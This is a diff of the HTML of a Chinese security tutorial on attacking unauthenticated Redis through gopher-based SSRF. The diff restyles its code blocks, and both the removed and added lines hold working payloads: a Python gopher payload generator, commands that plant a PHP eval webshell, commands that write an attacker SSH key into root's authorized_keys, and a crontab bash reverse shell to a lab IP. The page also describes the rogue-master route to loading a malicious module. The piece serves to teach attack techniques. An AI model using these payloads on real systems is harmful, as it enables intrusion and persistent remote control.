@@ -223,16 +223,8 @@
 <li>服务器根据命令实现回复一种RESP类型。</li>
 </ol>
 <p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p>
-<p>我们用<code>tcpdump</code>来抓个包来测试一下</p>
-<pre><code>tcpdump port 6379 -w ./Desktop/1.pcap
-</code></pre><p>redis客户端中执行如下命令</p>
-<pre class=" language-sh"><code class="language-sh">192.168.163.128:6379> set name test
-OK
-192.168.163.128:6379> get name
-"test"
-192.168.163.128:6379>
-
-</code></pre>
+<p>我们用<code>tcpdump</code>来抓个包来测试一下<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port 6379 -w ./Desktop/1.pcap</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>redis客户端中执行如下命令<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.163.128:6379&gt; <span class="built_in">set</span> name <span class="built_in">test</span></span><br><span class="line">OK</span><br><span class="line">192.168.163.128:6379&gt; get name</span><br><span class="line"><span class="string">"test"</span></span><br><span class="line">192.168.163.128:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>抓到的数据包如下</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -251,8 +243,8 @@ OK
             </figure>
 <p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
 <h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了<br><code>Gopher</code> 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><pre><code>能未授权或者能通过弱口令认证访问到Redis服务器
-</code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见的SSRF攻击方式大概有这几种：</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能未授权或者能通过弱口令认证访问到Redis服务器</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见的SSRF攻击方式大概有这几种：</p>
 <ol>
 <li><p>绝对路径写webshell</p>
 </li>
@@ -263,45 +255,8 @@ OK
 </ol>
 <p>下面我们逐个实现</p>
 <h2 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h2><p>这个方法比较常用，也是用得最多的=。=</p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令</p>
-<pre><code>flushall
-set 1 '&lt;?php eval($_GET["cmd"]);?&gt;'
-config set dir /var/www/html
-config set dbfilename shell.php
-save
-</code></pre><p>写了一个简单的脚本，转化为redis RESP协议的格式</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib
-protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
-ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
-port<span class="token operator">=</span><span class="token string">"6379"</span>
-shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
-filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
-path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
-passwd<span class="token operator">=</span><span class="token string">""</span>
-cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
-     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
-     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
-     <span class="token string">"save"</span>
-     <span class="token punctuation">]</span>
-<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
-    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
-<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
-    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
-    cmd<span class="token operator">=</span><span class="token string">""</span>
-    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
-        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
-    cmd<span class="token operator">+=</span>CRLF
-    <span class="token keyword">return</span> cmd
-
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> payload
-</code></pre>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 '&lt;?php eval($_GET["cmd"]);?&gt;'</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>写了一个简单的脚本，转化为redis RESP协议的格式<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.163.128"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">	 <span class="string">"set 1 {}"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"${IFS}"</span>)),</span><br><span class="line">	 <span class="string">"config set dir {}"</span>.format(path),</span><br><span class="line">	 <span class="string">"config set dbfilename {}"</span>.format(filename),</span><br><span class="line">	 <span class="string">"save"</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">"AUTH {}"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	CRLF=<span class="string">"\r\n"</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd=<span class="string">""</span></span><br><span class="line">	cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"${IFS}"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"${IFS}"</span>,<span class="string">" "</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="keyword">print</span> payload</span><br></pre></td></tr></tbody></table></figure><p></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -321,18 +276,8 @@ payload<span class="token operator">=</span>protocol<span class="token operator"
             </figure>
 <p>成功写入</p>
 <h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
-<h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令</p>
-<pre><code>flushall
-set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
-'
-config set dir /root/.ssh/
-config set dbfilename authorized_keys
-save
-</code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
-<pre class=" language-python"><code class="language-python">filename<span class="token operator">=</span><span class="token string">"authorized_keys"</span>
-ssh_pub<span class="token operator">=</span><span class="token string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span>
-path<span class="token operator">=</span><span class="token string">"/root/.ssh/"</span>
-</code></pre>
+<h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">'</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">ssh_pub=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>生成payload<br></p><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -370,19 +315,8 @@ path<span class="token operator">=</span><span class="token string">"/root/.ssh/
 </li>
 </ol>
 <p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
-<h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis的命令如下：</p>
-<pre><code>flushall
-set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n'
-config set dir /var/spool/cron/
-config set dbfilename root
-save
-</code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
-<pre class=" language-python"><code class="language-python">reverse_ip<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
-reverse_port<span class="token operator">=</span><span class="token string">"2333"</span>
-cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
-filename<span class="token operator">=</span><span class="token string">"root"</span>
-path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span>
-</code></pre>
+<h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis的命令如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n'</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse_ip=<span class="string">"192.168.163.132"</span></span><br><span class="line">reverse_port=<span class="string">"2333"</span></span><br><span class="line">cron=<span class="string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">"root"</span></span><br><span class="line">path=<span class="string">"/var/spool/cron"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>生成一波，尝试反弹shell<br></p><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -404,10 +338,8 @@ path<span class="token operator">=</span><span class="token string">"/var/spool/
 <ul>
 <li>能未授权或者能通过弱口令认证访问到Redis服务器</li>
 </ul>
-<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：</p>
-<pre><code>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
-redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。
-</code></pre><figure class="image-bubble">
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png" title="">
@@ -421,29 +353,8 @@ redis的持久化使得机器即使重启数据也不会丢失，因为redis服�
 <li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
 </ol>
 <p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
-<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p>
-<pre class=" language-sh"><code class="language-sh">redis-server /etc/redis/redis.conf
-redis-server /etc/redis/redis6380.conf
-</code></pre>
-<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code></p>
-<pre class=" language-sh"><code class="language-sh">root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379> SLAVEOF 127.0.0.1 6380
-OK
-127.0.0.1:6379> get test
-(nil)
-127.0.0.1:6379> exit
-root@kali:/usr/bin# redis-cli -p 6380
-127.0.0.1:6380> get test
-(nil)
-127.0.0.1:6380> set test "test"
-OK
-127.0.0.1:6380> get test
-"test"
-127.0.0.1:6380> exit
-root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379> get test
-"test"
-</code></pre>
+<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">redis-server /etc/redis/redis6380.conf</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get <span class="built_in">test</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">exit</span></span><br><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; get <span class="built_in">test</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">set</span> <span class="built_in">test</span> <span class="string">"test"</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6380&gt; get <span class="built_in">test</span></span><br><span class="line"><span class="string">"test"</span></span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">exit</span></span><br><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; get <span class="built_in">test</span></span><br><span class="line"><span class="string">"test"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
 <h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
 <p>恶意so文件编写：<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" title="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p>
@@ -463,21 +374,8 @@ root@kali:/usr/bin# redis-cli -p 6379
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>图中一些常量说明</p>
-<pre><code>#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */
-/* --- 握手状态开始 --- */
-#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */
-#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */
-#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */
-#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */
-#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */
-#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */
-#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */
-#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */
-#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */
-/* --- 握手状态结束 --- */
-#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */
-</code></pre><p>我这里主要讲一下最重要的那一步，就是利用全量复制将master上的<code>RDB</code>文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p>
+<p>图中一些常量说明<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */</span><br><span class="line">/* --- 握手状态开始 --- */</span><br><span class="line">#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */</span><br><span class="line">#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */</span><br><span class="line">#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */</span><br><span class="line">#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */</span><br><span class="line">#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */</span><br><span class="line">#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */</span><br><span class="line">#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */</span><br><span class="line">#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */</span><br><span class="line">#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */</span><br><span class="line">/* --- 握手状态结束 --- */</span><br><span class="line">#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>我这里主要讲一下最重要的那一步，就是利用全量复制将master上的<code>RDB</code>文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p>
 <p>那我们为什么一定要用全量复制呢？原因如下。<br>当slave向master发送<code>PSYNC</code>命令之后，一般会得到三种回复：</p>
 <ol>
 <li>+FULLRESYNC：进行全量复制。</li>
@@ -525,15 +423,10 @@ root@kali:/usr/bin# redis-cli -p 6379
 <p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p>
 <p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p>
 <h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ul>
-<li>配置一个我们需要以master身份给slave传输so文件的服务，大致流程如下<pre><code>PING 测试连接是否可用
-+PONG 告诉slave连接可用
-REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
-+OK 告诉slave成功接受
-REPLCONF 发送REPLCONF capa
-+OK 告诉slave成功接受
-PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC
-</code></pre>如下图所示：</li>
